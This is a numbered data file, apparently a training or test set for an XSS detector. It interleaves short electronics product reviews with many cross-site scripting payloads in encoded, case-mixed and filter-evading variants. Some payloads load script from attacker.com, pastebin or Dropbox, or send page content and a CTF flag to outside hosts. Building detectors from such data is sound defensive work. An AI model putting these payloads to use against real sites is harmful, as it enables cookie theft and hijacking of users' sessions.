292	<BODY ONLOAD=ALERT('HELLOX WORLDSS')>
293	+ACIAPGA8-SCRIPT+AD4-ALERT(DOCUMENT.LOCATION)+ADW-/SCRIPT+AD4APAAI-
294	"/>'><script src="/user_upload/mypic.png.js"></script>
295	Clear crisp sound.
296	&lt;DIV STYLE=\"width&#58; expression(alert('XSS'));\"&gt;
297	<TABLE BACKGROUND="javascript:alert('XSS')">
298	//<FoRM/aCtion=jAVAsCRIPt&#x3A;AleRt&lpAR;DocumeNT&pErIOd;COokie&rpaR;><INPUt/tYpe='SuBmit'>//
299	Great it was new packaged nice works good, no problems and it came in less time then I expected!!!!
300	This allows the possibility of double booking for the same date and time after the first.
301	<SVg><sCRipT %00>ALErt&lPaR;1&rPAR; {opErA}
302	The volume for the ringer is REAL good (you have choices how loud).
303	+ADW-SCRIPT+AD4-ALERT(DOCUMENT.LOCATION)+ADW-/SCRIPT+AD4-
304	It has everything I need and I couldn't ask for more.
305	"><IFRAME ONLOAD="EVAL('D=DOCUMENT; _=D.CREATEELEMENT(\'SCRIPT\');_.SRC=\'\/\/DOMAIN/M\';D.BODY.APPENDCHILD(_)')">
306	<TABLE><TD BACKGROUND="javascript:alert('XSS')">
307	</script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'>
308	<a id=x tabindex=1 onfocusin=alert(1)></a>
309	<SCRIPT/&TAB; SRC='HTTPS://DL.DROPBOX.COM/U/13018058/JS.JS' /&TAB;></SCRIPT>
310	<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
311	<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new Image().src='http://PLAYER_SERVER/?'+_)</script>
312	fOO\’; AlErT(DOcumEnT.COOkIe);//’;
313	+aciApga8-SCripT+Ad4-AlErT(DOCuMEnT.locaTioN)+adW-/SCRiPT+aD4apAai-
314	<SCRIPT>CONFIRM()</SCRIPT>
315	Case was more or less an extra that I originally put on but later discarded because it scratched my ear.
316	%2BACIAPGA8-SCRIPT%2BAD4-ALERT%28DOCUMENT.LOCATION%29%2BADW-%2FSCRIPT%2BAD4APAAI-
317	<iframe/src="data:text/html;&tab;base64&tab;,pgjvzhkgb25sb2fkpwfszxj0kdeppg==">
318	xss&#58;ex&#x2F;*XSS*//*/*/pression(alert(\"XSS\"))'&gt;
319	I used bitpim (a free program you can find on the internet)to transfer data to the phone.The price of the cable was excellent.
320	They do not last forever, but is not overly expensive to replace.Easy to operate and the sound is much better than others I have tried.
321	<a id=x tabindex=1 onfocusin=alert(1)></a>
322	<IFRAME/SRC=JAVASCRIPT:ALERT(1)>
323	<IFrame XMLNs="#" sRC="jAVaScRiPt:alERt(1)"></IFrAMe>
324	<svg onload="javascript:alert(123)" xmlns="#"></svg>
325	Disappointing accessory from a good manufacturer.
326	I got the car charger and not even after a week the charger was broken...I went to plug it in and it started smoking.
327	<a hREF="JavAsCRiPt:voId(0)" OnMouSEOver=&NeWLINE;jAVASCRipt:ALert(1)&NEwline;>X</A><///StYLe///><SpAN %2f onMOUSEmoVe='alert&LpaR;1&RPAR;'>sPAN
328	<form><isindex formaction="javascript&colon;confirm(1)"
329	&lt;STYLE&gt;@im\port'\ja\vasc\ript&#58;alert(\"XSS\")';&lt;/STYLE&gt;
330	Chinese Forgeries Abound!.
331	The camera on the phone may be used as a dustpan when indoors... I'd rather be using a disposable then this.
332	<iframe name="admin" src="https://bypasses-everywhere.ctf.insecurity-insa.fr/admin"></iframe>
333	&lt;img src=\"jav&#x0d;ascript&#058;alert('xss');\"&gt;
334	&lt;BODY ONLOAD=alert('XSS')&gt;
335	‘; alert(document.cookie); var foo=’
336	Better Than New.
337	im surprised this is a good quality car charger and there's not much reviews about it.
338	Blue Ant is easy to use.
339	<input onfocus=write(xss) autofocus>
340	<iFRaME src="jAvasCrIPt:aleRT('xSS');"></IfRAmE>
341	</script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'>
342	<scripT>cryptO.GeneRAtECrmFREqUESt('CN=0',0,0,NuLl,'alErT(1)',384,NulL,'RSa-Dual-use')</scRipT>
343	<IMG/SRC=`%00` ONERROR=THIS.ONERROR=CONFIRM(1)
344	It felt too light and "tinny.".
345	<scr<script>ipt>alert(document.cookie)</scr</script>ipt>
346	<maTH><A xLiNK:HreF="//JsfIDdLE.Net/T846h/">click
347	document.querySelector('DIV').innerHTML="<iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'></iframe>";
348	"><sCRIPt src=dAta:tExT/JavAScrIpT;BaSe64,ZD1Kb2N1bWVUDdSgxya9IgQuY3jlyxRlrWxLbWVUdCgnC2nyAxb0jyK7XY5pzD0NMtkNo18ubm9uy2U9ZC5xDwvyEVNLBgvjDg9yKCDbbm9uY2VdJykUBM9UY2u7Xy5ZCMM9jY8VBG9JyWXOB3N0l20nO2Quym9kEs5hchblbmRDAGLSZchfKsa=></SCrIPT>
349	Provides good protection and looks classy, too.
350	DO NOT BUY DO NOT BUYIT SUCKS
351	Steer clear of this product and go with the genuine Palm replacementr pens, which come in a three-pack.
352	I don't think it would hold it too securly on your belt.
353	<sVg oNLoAD="JAvascript:ALeRt(123)" xMlnS="#"></SvG>
354	This is cool because most cases are just open there allowing the screen to get all scratched up.
355	<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
356	Battery is holding up well.
357	Does everything it should and more.
358	<DIV STYLE="background-image: url(javascript:alert('XSS'))">
359	Their Research and Development division obviously knows what they're doing.
360	&lt;XSS STYLE=\"xss&#58;expression(alert('XSS'))\"&gt;
361	<iframe name="admin" src="https://bypasses-everywhere.ctf.insecurity-insa.fr/admin"></iframe>
362	<IMG SrC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
363	<A id=X TabinDex=1 OnfocUsin=aLErt(1)></A>
364	<ifRaME sRC='dAtA:Text/HTmL,<sCrIpt DeFer="trUe" SRc="dATa:TExT/JaVasCriPt,DOCumeNt.BOdY.iNnERtExt=/HellO/"></scriPT>'></IFRAme>
365	in addition it feels &amp; looks as if the phone is all lightweight cheap plastic.
366	<IFRAME/SRC="DATA:TEXT/HTML;&TAB;BASE64&TAB;,PGJVZHKGB25SB2FKPWFSZXJ0KDEPPG==">
367	After my phone got to be about a year old, it's been slowly breaking despite much care on my part.
368	<IMG/&#09;&#10;&#11; SRC=`~` ONERROR=PROMPT(1)>
369	&LT;IMG SRC=\"JAV&#X0D;ASCRIPT&#058;ALERT('XSS');\"&GT;
370	<Div StyLE="fOnT-FamILy:'FoO&#10;;COLor:rED;';">LoL
371	&lt;img lowsrc=\"javascript&#058;alert('xss')\"&gt;
372	"><a href="javascript:eval('d=document; _ = d.createelement(\'script\');_.src=\'//domain\';d.body.appendchild(_)')">click me for an awesome time</a>
373	<audio autoplay onplaying=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
374	</SCRIPT><IMG/*%00/SRC="WORKSINCHROME&COLON;PROMPT&#X28;1&#X29;"/%00*/ONERROR='EVAL(SRC)'>
375	&lt;DIV STYLE=\"background-image&#58;\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028&#46;1027\0058&#46;1053\0053\0027\0029'\0029\"&gt;
376	<EMBED SRC="DATA:IMAGE/SVG+XML;BASE64,PHN2ZYB4BWXUCZPZDMC9IMH0DH A6LY93D3CUDZMUB3JNLZIWMDAVC3ZNIIB4BWXUCZ0IAHR0CDOVL3D3DY53MY5VCMCV MJAWMC9ZDMCIIHHTBG5ZONHSAW5RPSJODHRWOI8VD3D3LNCZLM9YZY8XOTK5L3HS AW5RIIB2ZXJZAW9UPSIXLJAIIHG9IJAIIHK9IJAIIHDPZHROPSIXOTQIIGHLAWDODD0IMJAW IIBPZD0IEHNZIJ48C2NYAXB0IHR5CGU9INRLEHQVZWNTYXNJCMLWDCI+YWXLCNQOILH TUYIPOZWVC2NYAXB0PJWVC3ZNPG==" TYPE="IMAGE/SVG+XML" ALLOWSCRIPTACCESS="ALWAYS"></EMBED>
377	<img src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
378	<img """><script>alert("xss")</script>"\>
379	<script ^__^>alert(string.fromcharcode(49))</script ^__^
380	It does everything the description said it would.
381	Can't upload ringtones from a third party.
382	I am very happy
383	&Lt;DiV sTyLE=\"bAcKgRoUNd-imAGE&#58; url(JaVAsCRIpT&#058;alERT('XSs'))\"&Gt;
384	EXP/*&LT;A STYLE='NO\XSS&#58;NOXSS(\"*//*\");
385	<tablE><td BacKgROunD="jAVASCRIPT:ALERt('XSs')">
386	The sound quality is excellent as well.
387	exp/*&lt;a style='no\xss&#58;noxss(\"*//*\");
388	"/>'><sCRiPT sRc="/User_upLoad/mypic.Png.js"></sCript>
389	It works great with a car charger, especially if you cannot plug in two adapters at the same time.
390	<iframe src='data:text/html,<script defer="true" src="data:text/javascript,document.body.innertext=/hello/"></script>'></iframe>
391	For the price on Amazon, it is an excellent product, which I would highly recommend.
392	<sVG/onloAd="(neW ImAgE()).SrC='//atTACker.cOm/'%2bdoCumEnT.dOcuMeNteLemeNt.INNeRhtML">
393	Sprint - terrible customer service.
394	It feels poorly constructed, the menus are difficult to navigate, and the buttons are so recessed that it is difficult to push them.
395	After receiving and using the product for just 2 days it broke.
396	The earpiece on this is too large or too heavy...it keeps falling out of my ear.
397	<SVG ONLOAD="JAVASCRIPT:ALERT(123)" XMLNS="#"></SVG>
398	<IMg sRC=`%00`&NEWlINe; onerRoR=ALeRT(1)&NEWline;
399	The design is very good.4.
400	The nano stated it.My son was dissapointed.
401	<AUDIO AUTOPLAY ONPLAYING=ALERT(1)><SOURCE SRC="VALIDAUDIO.WAV" TYPE="AUDIO/WAV"></AUDIO>
402	&LT;ImG Src=\"jAV&#X09;AsCRiPt&#058;Alert('XsS');\"&GT;
403	"><iframe onload="eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')">
404	I really wanted the Plantronics 5 to be the right one, but it has too many issues for me.The good
405	Great product.
406	<div draGgaBlE="true" COntEntEDItabLe>DraG mE</Div><xsS ONdRop=aLeRT(1) CoNtENtEDITablE>DrOP hERe</XSS>
407	I contacted the company and they told me that, although the unit was still under warranty, if I couldn't produce my receipt I was out of luck.
408	I bought these hoping I could make my Bluetooth headset fit better but these things made it impossible to wear.
409	<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
410	<DIV STYLE="FONT-FAMILY:'FOO&#10;;COLOR:RED;';">LOL
411	%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-
412	&lt;div style=\"background-image&#58; url(javascript&#058;alert('xss'))\"&gt;
413	%2BADW-SCRIPT+AD4-ALERT(DOCUMENT.LOCATION)%2BADW-/SCRIPT%2BAD4-
414	&LT;TABLE&GT;&LT;TD BACKGROUND=\"JAVASCRIPT&#058;ALERT('XSS')\"&GT;
415	<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>
416	<STYle>@iM\pOrt'\jA\Vasc\rIpt:alert("XSs")';</sTYLe>
417	&lt;div style=\"background-image&#58; url(javascript&#058;alert('xss'))\"&gt;
418	&LT;STYLE&GT;@IMPORT'HTTP&#58;//HA&#46;CKERS&#46;ORG/XSS&#46;CSS';&LT;/STYLE&GT;
419	Do NOT buy if you want to use the holster.
420	//<form/action=javascript&#x3a;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
421	It doesn't make you look cool.
422	<SVG XMLNS="#"><SCRIPT>ALERT(1)</SCRIPT></SVG>
423	&lt;BGSoUND srC=\"JAvaScRIPT&#058;ALERt('xsS');\"&GT;
424	&lt;BR SIZE=\"&{alert('XSS')}\"&gt;
425	"/>'><SCRIpT sRc=httPS://AtTACkeR.coM/eVil.js></scRIPt>
426	&lt;div style=\"background-image&#58;\0075\0072\006c\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028&#46;1027\0058&#46;1053\0053\0027\0029'\0029\"&gt;
427	&LT;IMG SRC=\"JAV&#X0A;ASCRIPT&#058;ALERT('XSS');\"&GT;
428	<img/src=`%00` onerror=this.onerror=confirm(1)
429	Very wind-resistant.
430	My phone doesn't slide around my car now and the grip prevents my phone from slipping out of my hand.
431	Verizon tech support walked my through a few procedures, none of which worked and I ended up having to do a hard re-set, wiping out all my data.
432	"/>'><script src="/user_upload/mypic.png.js"></script>
433	<h1><fOnt CoLor=blUE>helloX WORldsS</h1>
434	<embed src="data:image/svg+xml;base64,phn2zyb4bwxuczpzdmc9imh0dh a6ly93d3cudzmub3jnlziwmdavc3zniib4bwxucz0iahr0cdovl3d3dy53my5vcmcv mjawmc9zdmciihhtbg5zonhsaw5rpsjodhrwoi8vd3d3lnczlm9yzy8xotk5l3hs aw5riib2zxjzaw9upsixljaiihg9ijaiihk9ijaiihdpzhropsixotqiighlawdodd0imjaw iibpzd0iehnzij48c2nyaxb0ihr5cgu9inrlehqvzwntyxnjcmlwdci+ywxlcnqoilh tuyipozwvc2nyaxb0pjwvc3znpg==" type="image/svg+xml" allowscriptaccess="always"></embed>
435	I have always used corded headsets and the freedom from the wireless is very helpful.
436	None of the three sizes they sent with the headset would stay in my ears.
437	Utter crap.. Sound quality is TERRIBLE.
438	Not only did the software do a great job of this, I could also make my own ringtones form my existing CDs without an internet connection.
439	<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_x.pdf">
440	T-Mobile has the best customer service anywhere.
441	<DIV STYLE="width: expression(alert('XSS'));">
442	&lt;IMG LOWSRC=\"javascript&#058;alert('XSS')\"&gt;
443	XSS&#58;EX&#X2F;*XSS*//*/*/PRESSION(ALERT(\"XSS\"))'&GT;
444	<div style="font-family:'foo&#10;;color:red;';">lol
445	<aUDIo autopLay onLoADeDmetADATA=aLert(1)> <source srC="valiDaUdio.WAV" TYPE="auDio/WaV"></aUDIO>
446	<FRAMESET><FRAME SRC="JAVASCRIPT:ALERT('XSS');"></FRAMESET>
447	WORTHWHILE.
448	I could not recommend these more.
449	I did not have any problem with this item and would order it again if needed.
450	&lt;diV sTyLE=\"wIDtH&#58; exPreSSION(alErT('xSS'));\"&gt;
451	&LT;liNK ReL=\"sTyLESHEET\" hrEF=\"javaScrIPT&#058;aLErT('XSs');\"&gT;
452	DOCUMENT.QUERYSELECTOR('DIV').INNERHTML="<IFRAME SRC='JAVASCRIPT:VAR S = DOCUMENT.CREATEELEMENT(\"SCRIPT\");S.SRC = \"HTTPS://PASTEBIN.COM/RAW/DW5CWGK6\";DOCUMENT.BODY.APPENDCHILD(S);'></IFRAME>";
453	<IFrAME %00 srC="&tab;jAVAScRiPt:pRoMpt(1)&TAb;"%00>
454	<ifRamE nAme="adMin" srC="HTTps://bYPASSES-eVeRYwHERE.ctF.inSeCURITY-InsA.Fr/ADMin"></IfRame>
455	<A HREF="JAVASCRIPT:VOID(0)" ONMOUSEOVER=&NEWLINE;JAVASCRIPT:ALERT(1)&NEWLINE;>X</A><///STYLE///><SPAN %2F ONMOUSEMOVE='ALERT&LPAR;1&RPAR;'>SPAN
456	<! foo="[[[Inception]]"><x foo="]foo><script>alert(1)</script>">
457	Cumbersome design.
458	It doesn't work in Europe or Asia.
459	//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
460	Due to this happening on every call I was forced to stop using this headset.
461	It's very convenient and simple to use - gets job done & makes the car ride so much smoother.
462	%2badw-script+ad4-alert(document.location)%2badw-/script%2bad4-
463	I am more than happy with this product.
464	<input onfocus=write(XSS) autofocus>
465	<imG/sRC=`%00` onErRor=tHiS.oNeRROr=cONfiRM(1)
466	<fRAmeseT><fRaMe src="jAVAsCRipT:ALErt('XSs');"></fraMesET>
467	&LT;sTYle&gT;@IM\POrT'\ja\VaSC\RiPt&#58;alERT(\"xSS\")';&LT;/STyle&GT;
468	You get what you pay for I guess.
469	It is light, has plenty of battery capacity, and is very confortable to wear for somewhat extended periods of time.
470	&lt;IMG SRC=\"jav&#x09;ascript&#058;alert('XSS');\"&gt;
471	jabra ear gels "R" the best!.
472	I love the look and feel of Samsung flipphones.
473	<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
474	exp/*&lt;A STYLE='no\xss&#58;noxss(\"*//*\");
475	<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}
476	&lt;img dynsrc=\"javascript&#058;alert('xss')\"&gt;
477	This phone might well be the worst I've ever had in any brand.
478	Cheap but hey it works.. Was pleasantly suprised given the low cost of this item.
479	<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
480	I am sorry I made this purchase.
481	The reception has been generally good.
482	<SCRIPT SRC="HTTPS://CDNJS.CLOUDFLARE.COM/AJAX/LIBS/PROTOTYPE/1.7.2/PROTOTYPE.JS"></SCRIPT><SCRIPT SRC="HTTPS://CDNJS.CLOUDFLARE.COM/AJAX/LIBS/ANGULAR.JS/1.0.8/ANGULAR.JS" /></SCRIPT><DIV NG-APP NG-CSP>{{ X = $ON.CURRY.CALL().EVAL("FETCH('HTTP://LOCALHOST/INDEX.PHP').THEN(D => {})") }}</DIV>"><SCRIPT SRC="HTTPS://CDNJS.CLOUDFLARE.COM/ANGULAR.MIN.JS"></SCRIPT> <DIV NG-APP NG-CSP>{{$EVAL.CONSTRUCTOR('ALERT(1)')()}}</DIV>"><SCRIPT SRC="HTTPS://CDNJS.CLOUDFLARE.COM/ANGULARJS/1.1.3/ANGULAR.MIN.JS"> </SCRIPT><DIV NG-APP NG-CSP ID=P NG-CLICK=$EVENT.VIEW.ALERT(1337)>
483	<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
484	Bought mainly for the charger, which broke soon after purchasing.
485	<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
486	<svg><script %00>alert&lpar;1&rpar; {opera}
487	<script>confirm()</script>
488	The design might be ergonomic in theory but I could not stand having these in my ear.
489	Finally, after three or four times the spring of the latch broke and I could not use it any longer on the visor.
490	It lasts less than 3o minutes, if I actually try to use the phone.My wife has the same phone with the same problem.
491	This fixes all the problems.
492	<h1><font color=blue>hellox worldss</h1>
493	%253CSCRIPT%253EALERT(DOCUMENT.COOKIE)%253C/SCRIPT%253E“><<SCRIPT>ALERT(DOCUMENT.COOKIE);//<</SCRIPT>
494	"><IfrAme oNLOaD="EvAl('d=dOcUMent; _=d.CREateeleMenT(\'SCrIpT\');_.sRC=\'\/\/DOmaIn/M\';d.BoDY.ApPendCHILD(_)')">
495	<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
496	&lt;IMG STYLE=\"xss&#58;expr/*XSS*/ession(alert('XSS'))\"&gt;
497	If you like a loud buzzing to override all your conversations, then this phone is for you!
498	<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
499	<SVG><STYLE>{FONT-FAMILY&COLON;'<IFRAME/ONLOAD=CONFIRM(1)>'
500	VERY cheap plastic, creaks like an old wooden floor.
501	Arrived quickly and much less expensive than others being sold.
502	<math><a xlink:href="//jsfiddle.net/t846h/">click
503	&LT;XSS STYLE=\"XSS&#58;EXPRESSION(ALERT('XSS'))\"&GT;
504	its extremely slow and takes forever to do anything with it.
505	<sCRipt/Src=hTTPS://WwW.GOOGle.cOm/compLETE/seArcH?CLIEnt=cHrOME&q=hELlO&cALlBack=aleRT></script>
506	The battery life is highly unacceptable.
507	<AUDIO CONTROLS AUTOPLAY ONENDED=ALERT(1)><SOURCE SRC="VALIDAUDIO.WAV" TYPE="AUDIO/WAV"></AUDIO>
508	<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
509	<IFRAME SRC="JAVASCRIPT:ALERT('XSS');"></IFRAME>
510	The handsfree part works fine, but then the car tries to download the address book, and the Treo reboots.Overall, I still rate this device high.
511	We have tried 2 units and they both failed within 2 months.. Pros
512	Linksys should have some way to exchange a bad phone for a refurb unit or something!
513	stay away from this store, be careful.
514	&lt;DIV STYLE=\"background-image&#58; url(javascript&#058;alert('XSS'))\"&gt;
515	&Lt;IMG StyLe=\"XSS&#58;EXPr/*xSS*/ESSiOn(aleRT('XSs'))\"&GT;
516	&lt;IMG DYNSRC=\"javascript&#058;alert('XSS')\"&gt;
517	clipping this to your belt will deffinitely make you feel like 5 cent's up-and-coming.
518	<% FOO><X FOO="%><SCRIPT>ALERT(123)</SCRIPT>">
519	&lt;style&gt;@im\port'\ja\vasc\ript&#58;alert(\"xss\")';&lt;/style&gt;
520	&LT;IMG STYLE=\"XSS&#58;EXPR/*XSS*/ESSION(ALERT('XSS'))\"&GT;
521	<OBjecT DATa="htTP://CORkaMI.GOogleCoDe.coM/svn/!SvN/Bc/480/TrunK/mIsc/PDf/HELlOwOrLd_Js_X.pdf">
522	<tAble bAckgrOUND="JAvaScRIPT:aleRT('XSs')">
523	"><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>
524	This is a great phone!.
525	<table><td background="javascript:alert('xss')">
526	This is a great deal.
527	<IFRAME SRCDOC='<SCRIPT SRC="DATA:TEXT/JAVASCRIPT,ALERT(DOCUMENT.DOMAIN)"></SCRIPT>'></IFRAME>
528	<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
529	I posted more detailed comments under the grey or black phone, but i have the Fire Red and it's a great color!
530	&lt;body background=\"javascript&#058;alert('xss')\"&gt;
531	&lt;link rel=\"stylesheet\" href=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;css\"&gt;
532	<iframe xmlns="#" src="javascript:alert(1)"></iframe>
533	Bluetooth does not work, phone locks up, screens just flash up and now it just makes calls randomly while in my pocket locked.
534	<div style="background-image: url(javascript:alert('xss'))">
535	<a hrEf="datA:TeXT/hTMl;blAbLa,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">CLiCk me</A>
536	<SvG XMlNs="#"><Script>AlERt(1)</ScRIpt></Svg>
537	<META HTTP-EQUIV="REFRESH" CONTENT="0;URL=JAVASCRIPT:ALERT('XSS');">
538	&LT;iMg DyNsRC=\"jAvaScriPt&#058;AlERt('Xss')\"&Gt;
539	Performed awful -- muffled, tinny incoming sound and severe echo for those on the other end of the call.
540	<IMG SRC=`%00`&NEWLINE; ONERROR=ALERT(1)&NEWLINE;
541	Easy to use.
542	It was a great phone.
543	&lt;IMG SRC=\"jav&#x0D;ascript&#058;alert('XSS');\"&gt;
544	+ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi-
545	<SVG><SCRIPT %00>ALERT&LPAR;1&RPAR; {OPERA}
546	&lt;img style=\"xss&#58;expr/*xss*/ession(alert('xss'))\"&gt;
547	I was amazed at the quick arrival of the two original lg cell phone batteries and and at a fraction of the price.
548	<sCrIpt srC="HtTps://cdNJS.cLoudflAre.coM/AJax/lIBS/ProTOTYpE/1.7.2/prototYpE.Js"></sCripT><sCRIpt SrC="httPs://cdNJs.CLOudFlaRe.CoM/aJAX/LiBs/aNGULAR.Js/1.0.8/ANGULaR.JS" /></SCriPT><DIv NG-ApP NG-CsP>{{ X = $oN.curRY.cAll().Eval("FetcH('HtTP://lOcalhOSt/indEX.phP').THEN(d => {})") }}</diV>"><scRiPT SRC="htTPs://cDnJs.clOuDflarE.cOm/AnGulAR.MIn.jS"></sCrIpt> <Div Ng-aPp Ng-Csp>{{$evaL.CoNstruCTOr('alert(1)')()}}</div>"><SCRIPt Src="HTtPs://cDNjs.CLOUDFlaRe.coM/AnGULaRJs/1.1.3/angULar.MIn.js"> </sCRipT><DiV nG-APp ng-csp id=P ng-clICk=$eVENt.vIEW.alert(1337)>
549	<h1><font color=blue>hellox worldss</h1>
550	I love this cable - it allows me to connect any mini-USB device to my PC.
551	"/>'><script src=https://attacker.com/evil.js></script>
552	THey are so cool!
553	<iframe srcdoc='<script src="data:text/javascript,alert(document.domain)"></script>'></iframe>
554	It plays louder than any other speaker of this size; the price is so low that most would think the quality is lacking, however, it's not.
555	<% foo><x foo="%><script>alert(123)</script>">
556	Setup went very smoothly.
557	<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script><div ng-app ng-csp>{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}</div>"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script><div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>
558	This particular model would not work with my Motorola Q smartphone.
559	<math><a xlink:href="//jsfiddle.net/t846h/">click
560	No ear loop needed, it's tiny and the sound is great.
561	Other than that, the leather is nice and soft; the fit is very tight; the cut out for the face is a good shape.
562	<audio controls autoplay onended=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
563	<! FOO="[[[INCEPTION]]"><X FOO="]FOO><SCRIPT>ALERT(1)</SCRIPT>">
564	Disapointing Results.
565	I'm happy about this purchase- good quality and low price.
566	‘; alert(document.cookie); var foo=’
567	Its the best headset I have used.
568	I only used it two days, and it wasn't always easy to hear with.
569	<script>confirm()</script>
570	<IMG SRC=JAVASCRIPT:ALERT(STRING.FROMCHARCODE(88,83,83))>
571	<OBJECT DATA="HTTP://CORKAMI.GOOGLECODE.COM/SVN/!SVN/BC/480/TRUNK/MISC/PDF/HELLOWORLD_JS_X.PDF">
572	<! foO="[[[INCePTION]]"><X FOO="]fOO><SCRIPt>alerT(1)</SCriPT>">
573	&Lt;stYLE&gT;@IMporT'hTtP&#58;//HA&#46;cKErs&#46;ORG/xsS&#46;csS';&lT;/stYLe&Gt;
574	The phone crashed completely and now I have to get it replaced.
575	But now that it is "out of warranty" the same problems reoccure.Bottom line... put your money somewhere else... Cingular will not support it.
576	<div style="background-image:\0075\0072\006c\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
577	Also, the phone doesn't seem to accept anything except CBR mp3s, preferably ripped by Windows Media Player.
578	<AUDIO AUTOPLAY ONLOADEDMETADATA=ALERT(1)> <SOURCE SRC="VALIDAUDIO.WAV" TYPE="AUDIO/WAV"></AUDIO>
579	What possesed me to get this junk, I have no idea...
580	<INPUT ONBLUR=WRITE(XSS) AUTOFOCUS><INPUT AUTOFOCUS>
581	Truly awful.
582	%22/%3e%3cbody%20onload=’document.write(%22%3cs%22%2b%22cript%20src=http://my.box.com/xss.js%3e%3c/script%3e%22)’%3e
583	%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E
